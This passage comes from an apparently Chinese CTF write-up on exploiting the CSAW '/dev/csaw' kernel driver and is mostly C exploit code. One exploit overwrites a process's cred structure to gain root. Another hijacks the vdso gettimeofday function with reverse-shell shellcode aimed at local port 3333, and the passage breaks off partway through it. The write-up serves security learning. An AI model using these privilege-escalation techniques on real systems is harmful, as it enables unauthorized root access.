class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> * target = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> root_cred[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(name,<span class="string">&quot;try2findmesauce&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,name);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;addr &lt; <span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        target = memmem(read_buff,<span class="number">0x1000</span>,name,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(target != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cred_addr = *(<span class="keyword">size_t</span> *)(target - <span class="number">0x8</span>);</span><br><span class="line">            real_cred_addr =  *(<span class="keyword">size_t</span> *)(target - <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred_addr == real_cred_addr)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found cred at 0x%lx\n&quot;</span>,addr+target-(<span class="keyword">size_t</span>)read_buff);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cred at 0x%lx\n&quot;</span>,cred_addr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cred_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find cred&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WAA(fd,channel_id,root_cred,cred_addr,<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;win~~~\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>VDSO Attack：（Ret2dir 的一种）</p>
<p>VDSO 是内核为了减少内核与用户空间频繁切换，提高系统调用效率而提出的机制，支持的系统调用有4个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
<li>clock_gettime()：用于计算精度和纳秒</li>
</ul>
<p>入侵的思路很简单，就是利用 WAA 把 vdso 中用于替代系统调用的函数劫持为 shellcode，然后调用这些函数，获取 VDSO 基地址有如下步骤：</p>
<ul>
<li>在高版本的 glibc 中，读取 ELF 辅助向量，计算 <code>gettimeofday</code> 字符串的偏移，用于在后续的爆破中判断是否找到 VDSO 基地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破获得 VDSO 地址，VDSO 是按页对齐的，且映射到空间的是个ELF文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">uint64_t</span> addr = <span class="number">0xffff880000000000</span>; addr&lt;<span class="number">0xffffc80000000000</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">    RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(read_buff+offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%p found it?\n&quot;</span>, addr);</span><br><span class="line">        vdso_addr = addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：能劫持 vdso 的核心就是 vdso 在内核状态下是可写的，高版本内核就不可写了</li>
</ul>
<p>如果爆破出了 VDSO 的内核地址，就使用 GDB 把 VDSO 给 dump 下来，然后拖入 IDA 寻找函数 <code>gettimeofday</code> 的偏移（在 <code>get_gettimeofday_str_offset</code> 中查找的是 <code>gettimeofday</code> 字符串偏移）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vdso_addr in kernel: <span class="number">0xffff880001e04000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; dump memory ./vdso.so <span class="number">0xffff880001e04000</span> <span class="number">0xffff880001e05000</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/10/08/cred%20attack+vdso%20attack/1665238227526.png" alt="1665238227526"> </p>
<p>写入的 Shellcode 是一个反弹 shell，它将 root shell 反弹到本地端口3333，我们只需 nc 本地端口3333即可 </p>
<ul>
<li>如果有 root 权限的程序，调用我们的 shellcode，那么我们的 shellcode 也是以 root 权限执行</li>
<li>在 Linux 中，crontab 是带有 root 权限的，并且它会不断的调用 vdso 里的 gettimeofday 函数</li>
<li>在 qemu 里，使用了一个程序来模拟（本题目是 <code>/sbin/init</code>）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> shellcode[]=<span class="string">&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    